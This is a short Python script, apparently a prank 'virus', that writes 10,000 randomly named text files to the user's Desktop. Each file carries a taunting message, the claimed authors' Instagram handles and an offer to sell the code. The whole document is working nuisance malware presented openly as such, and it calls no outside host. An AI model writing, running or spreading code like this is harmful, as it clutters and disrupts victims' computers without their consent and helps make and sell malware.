import os
import random
import string
import webbrowser
name=string.ascii_lowercase+string.ascii_uppercase+string.digits
def replicating ():
    username = os.getenv('userprofile')
    filename="".join(random.choices(name,k=random.randint(0,10)))
    username = fr'{username}\Desktop\{filename}.txt'

    with open(username, 'w') as file1:
        file1.write('HAVE A GREAT TIME DELETING THESE!!!! HUEHUEHUEHUE\n')
        file1.write(       'Virus made by:-\n')
        file1.write(        'Jap® and Jas®   (Patent Pending...)\n')
        file1.write(        'Instagram : @arorajas99      https://www.instagram.com/arorajas99/\n')
        file1.write(        '            @_.jap_codez_     https://www.instagram.com/_.jap_codez_/\n')
        file1.write("                   Contact for purchasing")

for i in range (10000):
    replicating()
